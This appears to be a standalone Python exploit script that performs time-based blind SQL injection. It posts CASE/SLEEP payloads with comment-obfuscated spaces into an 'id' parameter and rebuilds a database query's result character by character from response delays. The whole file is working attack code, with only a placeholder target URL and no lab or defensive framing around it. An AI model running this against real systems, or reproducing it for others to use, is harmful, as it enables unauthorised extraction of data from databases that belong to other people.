import time
import requests
import sys

url = 'url/method'
vulnerable_param = 'id'
query = "select version()".replace(' ', '/**/')
delay = 1

# lowercase: 97-122
# uppercase: 65-90
# specialchars with digits: 32-64, 91-96

lowercase_range = [x for x in range(97, 123)]
uppercase_range = [x for x in range(65, 91)]
digits_range = [x for x in range(48, 58)]
specialchars_range = [x for x in range(32, 48)]
specialchars_range += [x for x in range(58, 65)]
specialchars_range += [x for x in range(91, 97)]
specialchars_range += [x for x in range(123, 127)]


def dummy_method(url, inj_str, lower=True, upper=True, digits=True, other=True):
    if lower:
        for ascii_char_index in lowercase_range:
            t0 = time.time()
            requests.post(
                url,
                data={vulnerable_param: inj_str.replace("[CHAR]", str(ascii_char_index))}
            )
            response_delay = time.time() - t0
            # time based
            if (response_delay >= delay):
                return ascii_char_index
    if digits:
        for ascii_char_index in digits_range:
            t0 = time.time()
            requests.post(
                url,
                data={vulnerable_param: inj_str.replace("[CHAR]", str(ascii_char_index))}
            )
            response_delay = time.time() - t0
            # time based
            if (response_delay >= delay):
                return ascii_char_index
    if upper:
        for ascii_char_index in uppercase_range:
            t0 = time.time()
            requests.post(
                url,
                data={vulnerable_param: inj_str.replace("[CHAR]", str(ascii_char_index))}
            )
            response_delay = time.time() - t0
            # time based
            if (response_delay >= delay):
                return ascii_char_index
    if other:
        for ascii_char_index in specialchars_range:
            t0 = time.time()
            requests.post(
                url,
                data={vulnerable_param: inj_str.replace("[CHAR]", str(ascii_char_index))}
            )
            response_delay = time.time() - t0
            # time based
            if (response_delay >= delay):
                return ascii_char_index
    return None


def inject(query, custom_range, lower=True, upper=True, digits=True, other=True):
    result = ""
    for i in range(1, custom_range):
        injection_string = "0 AND (select case when (" \
                                                     "select ascii(" \
                                                         "substring((%s),%d,1)" \
                                                    ")=[CHAR]" \
                           ") then sleep(%d) end)".replace(' ', '/**/') % (query, i, delay)
        data = dummy_method(url, injection_string, lower=lower, upper=upper, digits=digits, other=other)
        if data:
            extracted_char = chr(data)
        else:
            print(str(data))
            break
        if extracted_char:
            result += extracted_char
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
    return result


def execute(query):
    result = inject(query, 2000)
    print("\nGot result: ")
    print(result)
    return result


result = execute(query)
